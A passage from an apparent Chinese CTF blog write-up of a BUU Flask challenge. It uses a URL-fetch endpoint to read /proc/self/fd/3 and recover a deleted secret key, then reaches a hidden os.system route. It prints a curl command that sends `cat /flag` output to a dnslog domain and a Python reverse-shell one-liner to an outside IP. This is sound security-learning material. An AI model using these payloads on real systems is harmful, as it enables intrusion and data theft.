descriptor）差不多就是<strong>路径</strong>啦，这些文件描述符是指向实际文件的一个符号连接，即每个通过这个进程打开的文件都会显示在这里。所以我们可以通过<strong>fd</strong>目录的文件获取进程，从而打开每个文件的路径以及文件内容。</p><p>这个fd比较重要，因为在Linux系统中，如果一个程序用 open() 打开了一个文件，但是最终没有关闭它，即使从外部（如：os.remove(SECRET_FILE))删除这个文件之后，在&#x2F;proc这个进程的 pid目录下的fd文件描述符 目录下 还是会有这个文件的文件描述符，通过这个文件描述符我们即可以得到被删除的文件的内容</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">读取</span><br><span class="line">/proc/self/environ   当前环境</span><br><span class="line">/proc/self/cmdline 启动当前进程的完整命令---发现有app.py</span><br><span class="line">/proc/self/fd/文件描述符   查看当前进程打开的文件内容   </span><br><span class="line"></span><br><span class="line">读取app.py</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">SECRET_FILE = <span class="string">&quot;/tmp/secret.txt&quot;</span></span><br><span class="line">f = <span class="built_in">open</span>(SECRET_FILE)</span><br><span class="line">SECRET_KEY = f.read().strip()</span><br><span class="line">os.remove(SECRET_FILE)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;search.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/page&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">page</span>():</span><br><span class="line">    url = request.args.get(<span class="string">&quot;url&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> url.lower().startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">            res = urllib.urlopen(url)</span><br><span class="line">            value = res.read()</span><br><span class="line">            response = Response(value, mimetype=<span class="string">&#x27;application/octet-stream&#x27;</span>)</span><br><span class="line">            response.headers[<span class="string">&#x27;Content-Disposition&#x27;</span>] = <span class="string">&#x27;attachment; filename=beautiful.jpg&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> response</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            value = <span class="string">&quot;HACK ERROR!&quot;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        value = <span class="string">&quot;SOMETHING WRONG!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;search.html&#x27;</span>, res=value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/no_one_know_the_manager&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">manager</span>():</span><br><span class="line">    key = request.args.get(<span class="string">&quot;key&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(SECRET_KEY)</span><br><span class="line">    <span class="keyword">if</span> key == SECRET_KEY:</span><br><span class="line">        shell = request.args.get(<span class="string">&quot;shell&quot;</span>)</span><br><span class="line">        os.system(shell)</span><br><span class="line">        res = <span class="string">&quot;ok&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res = <span class="string">&quot;Wrong Key!&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8080</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h4><h5 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">发现了open一个secret.txt，但是没有关闭，而是用os.remove,那么我们就可以通过fd目录查看他的内容。page页即url查询的东西最终会写入beautiful.jpg以文件形式返回。/no_one_know_the_manager页则是有shell可以执行，只要key == SECRET_KEY，那么就可以执行，但是这里是没有回显的。随便传命令和key进去，发现没有print(SECRET_KEY)，而只有wrong key!,应该是被删除了。那我们前面有个secret.txt读一读</span><br></pre></td></tr></table></figure><p>&#x2F;page?url&#x3D;&#x2F;proc&#x2F;self&#x2F;fd&#x2F;3      最后一位爆破出来发现是3</p><p>得到L7KoQ22Yv4kvrYqNrxWQMRcXWJ4BGFMDnTEqgA6YT8w&#x3D;  应该就是key</p><p>试一下&#x2F;no_one_know_the_manager?key&#x3D;L7KoQ22Yv4kvrYqNrxWQMRcXWJ4BGFMDnTEqgA6YT8w&#x3D;&amp;shell&#x3D;ls</p><p>回显OK则正确。（如果出错，那么url编码一下key)</p><p>接下来由于是无回显的，那么需要在服务器反弹shell</p><p>由于没有服务器，所以参考网上用buu靶机来做。结果发现buu的靶机也不行。先搁置着（坑）</p><p>不过可以选择dnslog外带数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/no_one_know_the_manager?key=%32%4c%38%57%2f%39%51%51%4d%31%54%4b%49%70%37%66%61%73%6e%50%33%4c%41%2b%59%43%75%33%65%65%6f%47%69%70%6d%68%30%56%6f%49%46%4c%41%3d&amp;shell=curl%20`cat%09/flag`.yae4q7.dnslog.cn</span><br><span class="line">反引号内执行语句，由于ls /只有返回了var一个结果，其他结果返回不了，看其他wp说ls /|base64可以，但是试了一下不行，猜测/flag，刚好出了。</span><br><span class="line">别人的是curl 118.***.***.***/`ls /|base64`</span><br><span class="line"></span><br><span class="line">注意在发送数据时候，若是等一会则说明在解析dnslog地址，若是直接返回，那估计是命令敲错了，而且这种方法有些命令也执行不了，还是服务器香点</span><br><span class="line"></span><br><span class="line">还有一些用tee命令写到文件里面的，下次再试试，记录一下（坑）</span><br></pre></td></tr></table></figure><p><img src="C:\Users\wen\AppData\Roaming\Typora\typora-user-images\image-20230211152640844.png" alt="image-20230211152640844"></p><p>反弹shell</p><p>Python</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import</span><br><span class="line">os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;172.16.154.239&#x27;,7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://blog.csdn.net/Zero_Adam/article/details/114890384">https://blog.csdn.net/Zero_Adam/article/details/114890384</a></p><p><a href="https://blog.csdn.net/wuyaowangchuan/article/details/114540227">https://blog.csdn.net/wuyaowangchuan/article/details/114540227</a></p><p><a href="https://blog.csdn.net/Zero_Adam/article/details/114853022">https://blog.csdn.net/Zero_Adam/article/details/114853022</a>  （坑）</p><p><a href="https://blog.csdn.net/weixin_39890543/article/details/112989316">https://blog.csdn.net/weixin_39890543/article/details/112989316</a> （坑）</p><p><a href="https://blog.csdn.net/pop364/article/details/106083847">https://blog.csdn.net/pop364/article/details/106083847</a> （buu靶机）</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h3 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h3&gt;&lt;p&gt;进入就是一个输入框，搜集信息啥也没有。输入之后url会有 ?url&amp;#x3D;&lt;/p&gt;
-&lt;p&gt;一般这种就是路径遍历，ssrf，或者文件包含，</summary>
-      
-    
-    
-    
-    
-    <category term="buu" scheme="http://van0308.github.io/tags/buu/"/>
-    
-    <category term="坑" scheme="http://van0308.github.io/tags/%E5%9D%91/"/>
     
   </entry>
   
